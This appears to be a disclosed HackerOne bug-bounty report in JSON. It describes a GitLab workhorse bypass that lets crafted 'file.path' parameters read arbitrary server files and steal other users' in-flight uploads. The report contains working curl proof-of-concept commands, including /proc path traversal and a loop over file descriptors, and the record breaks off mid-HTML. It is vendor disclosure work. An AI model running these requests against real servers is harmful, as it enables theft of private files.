{"id":850447,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTA0NDc=","url":"https://hackerone.com/reports/850447","title":"gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-04-15T14:59:54.154Z","submitted_at":"2020-04-15T14:59:54.154Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-06-08T04:57:08.889Z","bug_reporter_agreed_on_going_public_at":"2020-06-07T01:28:28.614Z","team_member_agreed_on_going_public_at":"2020-06-08T04:57:08.801Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\nExtracted from https://hackerone.com/reports/835455#activity-7672566\n\nWhile testing and looking at the patch for the nuget package workhorse bypass (https://gitlab.com/gitlab-org/gitlab/issues/209080 I think) I came across a more widespread bypass:\n\n```bash\n# create test file on gitlab server\necho hello \u003e /tmp/ggg; sudo chown git:git /tmp/ggg\n\n# attacker\ncurl -XPUT -v -F '[package]=@/tmp/lala.txt' \"http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg\"\n\n{\"message\":\"201 Created\"}\n```\n\nUsing `[package]` as the field name causes the `@rewritten_fields` to contain:\n\n```json\n{\n  \"rewritten_fields\": {\n    \"[package]\": \"/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799\"\n  },\n  \"iss\": \"gitlab-workhorse\"\n}\n```\nThis is then used `parsed_field = Rack::Utils.parse_nested_query(field)` which ends up creating the hash `{\"package\"=\u003enil}` (same as package would return). This passes the validation, but the `Multipart::Handler` will then use the query params as they match instead of the payload that workhorse sends through.\n\nThis also allows for any file in the following to be accessed:\n\n```ruby\n       def allowed_paths\n          [\n            ::FileUploader.root,\n            Gitlab.config.uploads.storage_path,\n            JobArtifactUploader.workhorse_upload_path,\n            File.join(Rails.root, 'public/uploads/tmp')\n          ]\n        end\n```\n\nThis could be done anywhere that accelerated uploads, eg the `UploadsController` or uploading a wiki file.\n\nUsing the wiki api removes the restriction that the file needs to be owned by `git` due to `file_content: attrs[:file].read` happening instead of moving the original file:\n\n```bash\necho hello \u003e /tmp/ggg; sudo chown root:root /tmp/ggg\n\n$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'\n\n{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\n```\n\nIt's also fairly easy to steal incoming files tmp files that are currently opened in rails by:\n\n1. Determine a valid PID by looping over `/proc/PID` until a `cwd` is found and readable by `git` (eg the `unicorn` worker will have `/proc/19606/cwd -\u003e /var/opt/gitlab/gitlab-rails/working`) and traverse to a valid upload path:\n\n    ```bash\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n500\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n201\n    ```\n\n1. Using this pid, use `/proc/PID/fd/XX` as the `file.path` (looking at my server a fd of 44 was the used pretty consistently for tmp files) and run it in a loop:\n\n    ```bash\n$ while true; do curl -s -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done\n    ```\n\n1. Upload a bunch of things, eventually a file will be stolen:\n\n    ```json\n{\"file_name\":\"image.png115893730\",\"file_path\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"markdown\":\"[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)\"}}\n    ```\n\n### Steps to reproduce\n\n1. create a new project\n1. create a wiki page\n1. create a test file on the gitlab server: `echo hello \u003e /tmp/ggg;`\n1. create a dummy file on the attackers server `echo unused \u003e /tmp/lala.txt`\n1. Upload a wiki file using the crafted params\n        ```bash\n$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`\n{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\n        ```\n1. paste the markdown into the wiki page and download the file\n\n### Impact\n* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`\n* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.\n\n### Examples\n* https://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home\nThe above was uploaded using `file.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html` to verify.\n\n### What is the current *bug* behavior?\nAn attacker can specify `file.*` params and have gitlab believe they are valid and signed \n\n### What is the expected *correct* behavior?\nOnly params from the workhorse should be valid\n\n### Output of checks\n#### Results of GitLab environment info\n```\nSystem information\nSystem:     Ubuntu 18.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.5p114\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.7\nGit Version:    2.24.1\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab information\nVersion:    12.9.3-ee\nRevision:   7c13691fb8e\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.12\nURL:        http://gitlab-vm.local\nHTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    12.0.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`\n* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eExtracted from \u003ca title=\"https://hackerone.com/reports/835455#activity-7672566\" href=\"https://hackerone.com/reports/835455#activity-7672566\"\u003ehttps://hackerone.com/reports/835455#activity-7672566\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhile testing and looking at the patch for the nuget package workhorse bypass (\u003ca title=\"https://gitlab.com/gitlab-org/gitlab/issues/209080\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2Fissues%2F209080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab/issues/209080\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e I think) I came across a more widespread bypass:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e# create test file on gitlab server\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho \u003c/span\u003ehello \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e /tmp/ggg\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003esudo chown \u003c/span\u003egit:git /tmp/ggg\n\n\u003cspan class=\"c\"\u003e# attacker\u003c/span\u003e\ncurl \u003cspan class=\"nt\"\u003e-XPUT\u003c/span\u003e \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;[package]=@/tmp/lala.txt\u0026#39;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;http://vakzz:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;201 Created\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing \u003ccode\u003e[package]\u003c/code\u003e as the field name causes the \u003ccode\u003e@rewritten_fields\u003c/code\u003e to contain:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;rewritten_fields\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;[package]\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;iss\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;gitlab-workhorse\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is then used \u003ccode\u003eparsed_field = Rack::Utils.parse_nested_query(field)\u003c/code\u003e which ends up creating the hash \u003ccode\u003e{\u0026quot;package\u0026quot;=\u0026gt;nil}\u003c/code\u003e (same as package would return). This passes the validation, but the \u003ccode\u003eMultipart::Handler\u003c/code\u003e will then use the query params as they match instead of the payload that workhorse sends through.\u003c/p\u003e\n\n\u003cp\u003eThis also allows for any file in the following to be accessed:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e       \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eallowed_paths\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eFileUploader\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eroot\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"no\"\u003eGitlab\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003econfig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003euploads\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estorage_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"no\"\u003eJobArtifactUploader\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eworkhorse_upload_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"no\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eRails\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eroot\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;public/uploads/tmp\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis could be done anywhere that accelerated uploads, eg the \u003ccode\u003eUploadsController\u003c/code\u003e or uploading a wiki file.\u003c/p\u003e\n\n\u003cp\u003eUsing the wiki api removes the restriction that the file needs to be owned by \u003ccode\u003egit\u003c/code\u003e due to \u003ccode\u003efile_content: attrs[:file].read\u003c/code\u003e happening instead of moving the original file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003eecho \u003c/span\u003ehello \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e /tmp/ggg\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003esudo chown \u003c/span\u003eroot:root /tmp/ggg\n\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-g\u003c/span\u003e \u003cspan class=\"nt\"\u003e-XPOST\u003c/span\u003e \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;[file]=@/tmp/lala.txt\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;file_name\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;ggg\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;file_path\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;uploads/58ec1627b3f14eba0a16659fd859da63/ggg\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;branch\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;master\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;link\u0026quot;\u003c/span\u003e:\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;uploads/58ec1627b3f14eba0a16659fd859da63/ggg\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;markdown\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s also fairly easy to steal incoming files tmp files that are currently opened in rails by:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eDetermine a valid PID by looping over \u003ccode\u003e/proc/PID\u003c/code\u003e until a \u003ccode\u003ecwd\u003c/code\u003e is found and readable by \u003ccode\u003egit\u003c/code\u003e (eg the \u003ccode\u003eunicorn\u003c/code\u003e worker will have \u003ccode\u003e/proc/19606/cwd -\u0026gt; /var/opt/gitlab/gitlab-rails/working\u003c/code\u003e) and traverse to a valid upload path:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e /dev/null \u003cspan class=\"nt\"\u003e-w\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;%{http_code}\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-XPOST\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;[file]=@/tmp/lala.txt\u0026#39;\u003c/span\u003e\n500\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e /dev/null \u003cspan class=\"nt\"\u003e-w\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;%{http_code}\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-XPOST\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;[file]=@/tmp/lala.txt\u0026#39;\u003c/span\u003e\n201\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUsing this pid, use \u003ccode\u003e/proc/PID/fd/XX\u003c/code\u003e as the \u003ccode\u003efile.path\u003c/code\u003e (looking at my server a fd of 44 was the used pretty consistently for tmp files) and run it in a loop:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile \u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e \u003cspan class=\"nt\"\u003e-XPOST\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-F\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;[file]=@/tmp/lala.txt\u0026#39;\u003c/span\u003e| \u003cspan class=\"nb\"\u003egrep \u003c/span\u003efile_name\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUpload a bunch of things, eventually a file will be stolen:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;file_name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;image.png115893730\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;file_path\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;branch\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;master\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;link\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;markdown\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003ecreate a new project\u003c/li\u003e\n\u003cli\u003ecreate a wiki page\u003c/li\u003e\n\u003cli\u003ecreate a test file on the gitlab server: \u003ccode\u003eecho hello \u0026gt; /tmp/ggg;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003ecreate a dummy file on the attackers server \u003ccode\u003eecho unused \u0026gt; /tmp/lala.txt\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eUpload a wiki file using the crafted params\n    \u003ccode\u003ebash\n$ curl -g -XPOST -v -H \u0026quot;Authorization: Bearer $TOKEN\u0026quot; \u0026#39;http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg\u0026#39; -F \u0026#39;[file]=@/tmp/lala.txt\u0026#39;`\n{\u0026quot;file_name\u0026quot;:\u0026quot;ggg\u0026quot;,\u0026quot;file_path\u0026quot;:\u0026quot;uploads/58ec1627b3f14eba0a16659fd859da63/ggg\u0026quot;,\u0026quot;branch\u0026quot;:\u0026quot;master\u0026quot;,\u0026quot;link\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;uploads/58ec1627b3f14eba0a16659fd859da63/ggg\u0026quot;,\u0026quot;markdown\u0026quot;:\u0026quot;[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\u0026quot;}}\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003epaste the markdown into the wiki page and download the file\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"impact\"\u003eImpact\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eread known files in \u003ccode\u003e::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, \u0026#39;public/uploads/tmp\u0026#39;)\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eread unknown inflight files by using the symlinks in \u003ccode\u003e/proc/PID/fd/XX\u003c/code\u003e belonging to other users.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ca title=\"https://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fvakzz-h1%2Fworkhorse-bypass%2F-%2Fwikis%2Fhome\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\nThe above was uploaded using \u003ccode\u003efile.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html\u003c/code\u003e to verify.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"what-is-the-current-bug-behavior\"\u003eWhat is the current \u003cem\u003ebug\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eAn attacker can specify \u003ccode\u003efile.*\u003c/code\u003e params and have gitlab believe they are valid and signed \u003c/p\u003e\n\n\u003ch3 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eOnly params from the workhorse should be valid\u003c/p\u003e\n\n\u003ch3 id=\"output-of-checks\"\u003eOutput of checks\u003c/h3\u003e\n\n\u003ch4 id=\"results-of-gitlab-environment-info\"\u003eResults of GitLab environment info\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSystem information\nSystem:     Ubuntu 18.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.5p114\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.7\nGit Version:    2.24.1\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab 